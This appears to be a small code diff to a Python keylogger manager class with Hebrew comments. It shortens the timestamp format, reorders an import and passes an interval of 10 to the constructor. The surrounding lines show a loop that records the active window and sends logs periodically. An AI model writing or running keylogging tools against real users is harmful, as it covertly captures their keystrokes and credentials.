@@ -1,5 +1,5 @@
-import json
 from component import *
+import json
 import time
 import os
 import socket
@@ -42,7 +42,7 @@ class KeyLoggerManager:
                 time.sleep(self.SEND_INTERVAL)  # מחכה לפי ההגדרה
                 
                 # חותמת זמן
-                timestamp: str = time.strftime("%Y-%m-%d %H:%M:%S")
+                timestamp: str = time.strftime("%Y-%m-%d %H:%M")
                 
                 # קבלת שם האפליקציה הפעילה
                 active_app: str = self.get_active_window()
@@ -80,5 +80,5 @@ class KeyLoggerManager:
             key_logger.stop_logging()  # עצירת ההקלטה אם התהליך נעצר ידנית
 
 if __name__ == "__main__":
-    key_logger_manager = KeyLoggerManager()
+    key_logger_manager = KeyLoggerManager(10)
     key_logger_manager.start_log()
